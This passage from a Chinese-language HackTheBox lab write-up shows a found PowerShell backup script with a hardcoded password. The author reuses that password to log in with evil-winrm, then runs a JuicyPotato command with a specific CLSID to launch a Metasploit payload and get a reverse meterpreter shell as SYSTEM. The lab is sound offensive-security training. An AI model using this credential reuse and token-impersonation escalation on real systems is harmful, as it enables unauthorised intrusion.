class="line">30</span><br></pre></td><td class="code"><pre><span class="line">db_backup.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Work in progress database backup script. Adapting from mysql backup script. Does not work yet. Do not use.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Alltheleavesarebrown1&#x27;</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;sophie&#x27;</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Net.NetworkCredential(<span class="variable">$user</span>, <span class="variable">$password</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$date</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="variable">$dateString</span> = <span class="variable">$date</span>.Year.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Month.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Day.ToString()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Create symbolic link for sqldump.exe in the script folder</span></span><br><span class="line"><span class="variable">$sqldumpLocation</span> = \.sqldump.exe</span><br><span class="line"><span class="variable">$backupDest</span> = C:\DB_backups\SQL\sql_backup_<span class="string">&quot;+ <span class="variable">$dateString</span> + &quot;</span>.sql<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$execute_sqldump</span> = <span class="variable">$sqldumpLocation</span>+&quot;</span> <span class="literal">-u</span><span class="string">&quot;+<span class="variable">$cred</span>.UserName+&quot;</span> <span class="literal">-p</span><span class="string">&quot;+<span class="variable">$cred</span>.Password +&quot;</span> &gt; <span class="string">&quot; + <span class="variable">$backupDest</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">invoke-expression <span class="variable">$execute_sqldump</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># use 7zip to compress and encrypt the backup with same password as used to autheticate the sql backup user</span></span><br><span class="line"><span class="string"># removes the unencrypted .sql file afterwards</span></span><br><span class="line"><span class="string"># create symbolic link for 7z.exe in the script folder</span></span><br><span class="line"><span class="string"><span class="variable">$sevenzip</span> = &quot;</span>.<span class="comment">#7z.exe&quot;</span></span><br><span class="line"><span class="variable">$zipfile</span> = <span class="variable">$backupDest</span>.Replace(<span class="string">&quot;.sql&quot;</span>,<span class="string">&quot;.7z&quot;</span>)</span><br><span class="line"><span class="variable">$execute7zip</span> = <span class="variable">$sevenzip</span>+<span class="string">&quot; a -t7z &quot;</span>+<span class="variable">$zipfile</span>+<span class="string">&quot; &quot;</span>+<span class="variable">$backupDest</span>+<span class="string">&quot; -p&quot;</span>+<span class="variable">$cred</span>.Password</span><br><span class="line"><span class="built_in">invoke-expression</span> <span class="variable">$execute7zip</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$backupDest</span></span><br></pre></td></tr></table></figure><p>找到一组系统密码<code>sophie:Alltheleavesarebrown1</code>，接着我们用evil-winrm连接一下：</p><p><img src="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg"></p><p>连接成功，在Users目录下看到flag。</p><h3 id="I-prefer-mine-with-the-skins-on"><a href="#I-prefer-mine-with-the-skins-on" class="headerlink" title="I prefer mine with the skins on"></a>I prefer mine with the skins on</h3><p>接下来我们执行一下<code>whoami /all</code>：</p><p><img src="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg"></p><p>发现该用户有SeAssignPrimaryTokenPrivilege特权。我们知道令牌创建进程使用的CreateProcessAsUserA这个API要求用户必须拥有SeAssignPrimaryTokenPrivilege特权，因此接下来我们可以进行令牌窃取以提升至system权限。我这里使用的工具是juicy potato。首先上传juicy potato和msf生成的马，之后执行以下命令反弹meterpreter：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c <span class="string">&quot;JuicyPotato.exe -t u -p C:\Users\sophie\Documents\shell-1243.exe -l 1243 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>因为我们使用的是CreateProcessAsUserA这个API，因此-t参数的值为u，-c参数为对应操作系统的COM对象的CLSID，这台主机是windows server 2016的，可以选择的对象有COMXblGameSave，其CLSID为{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}。 至此，最后一台主机的system权限也已经拿到了。打完，收工！</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>最后贴一波证书吧：</p><p><img src="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
